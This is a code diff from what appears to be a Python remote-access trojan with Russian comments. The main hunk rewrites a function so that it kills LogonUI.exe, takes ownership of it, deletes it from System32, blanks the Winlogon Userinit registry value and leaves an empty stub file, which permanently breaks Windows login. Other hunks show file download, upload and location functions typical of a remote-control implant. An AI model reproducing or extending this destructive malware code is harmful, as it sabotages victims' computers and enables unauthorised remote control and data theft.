@@ -170,16 +170,41 @@ def get_location():
     except:
         return "❌ Location error"
 
-def kill_logonui():
-    """Убивает процесс LogonUI (экран входа в систему)"""
+def kill_logonui_permanently():
     try:
-        # Ищем процесс LogonUI
-        result = subprocess.run(["tasklist", "/FI", "IMAGENAME eq LogonUI.exe"], capture_output=True, text=True)
-        if "LogonUI.exe" in result.stdout:
-            os.system("taskkill /f /im LogonUI.exe")
-            return "💀 LogonUI убит! Экран входа закрыт!"
-        else:
-            return "❌ LogonUI не найден"
+        # 1. Останавливаем процесс
+        os.system("taskkill /f /im LogonUI.exe")
+        
+        # 2. Удаляем сам файл
+        system32 = os.path.join(os.environ['SystemRoot'], 'System32')
+        logonui_path = os.path.join(system32, 'LogonUI.exe')
+        
+        if os.path.exists(logonui_path):
+            # Сначала меняем владельца и права (иначе доступ запрещён)
+            os.system(f'takeown /f "{logonui_path}"')
+            os.system(f'icacls "{logonui_path}" /grant Administrators:F')
+            
+            # Удаляем
+            os.remove(logonui_path)
+            return "💀 LogonUI.exe полностью удалён с диска!"
+        
+        # 3. Удаляем из реестра (чтобы даже не пытался запускаться)
+        key = winreg.OpenKey(
+            winreg.HKEY_LOCAL_MACHINE,
+            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
+            0,
+            winreg.KEY_WRITE
+        )
+        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, "explorer.exe")
+        winreg.SetValueEx(key, "Userinit", 0, winreg.REG_SZ, "")
+        winreg.CloseKey(key)
+        
+        # 4. Подменяем файл заглушкой (чтобы система не восстановила)
+        with open(logonui_path, 'w') as f:
+            f.write("")  # Пустой файл с тем же именем
+        
+        return "💀 LogonUI уничтожен полностью! Экран входа НИКОГДА не появится!"
+        
     except Exception as e:
         return f"❌ Ошибка: {e}"
 
@@ -619,10 +644,11 @@ def scream_make(video_path):
 def download_file(url):
     try:
         filename = url.split('/')[-1].split('?')[0] or 'download'
+        full_path = os.path.join(tempfile.gettempdir(), filename)  # <-- TEMP
         response = requests.get(url, timeout=30)
-        with open(filename, 'wb') as f:
+        with open(full_path, 'wb') as f:
             f.write(response.content)
-        return f"✅ Downloaded: {filename}"
+        return f"✅ Downloaded: {full_path}"
     except:
         return "❌ Failed"
 
@@ -636,9 +662,10 @@ def download_file_from_pc(file_path):
 
 def upload_file_to_pc(file_bytes, filename):
     try:
-        with open(filename, 'wb') as f:
+        full_path = os.path.join(tempfile.gettempdir(), filename)  # <-- TEMP
+        with open(full_path, 'wb') as f:
             f.write(file_bytes)
-        return f"✅ File saved: {filename}"
+        return f"✅ File saved: {full_path}"
     except:
         return "❌ Failed"
 
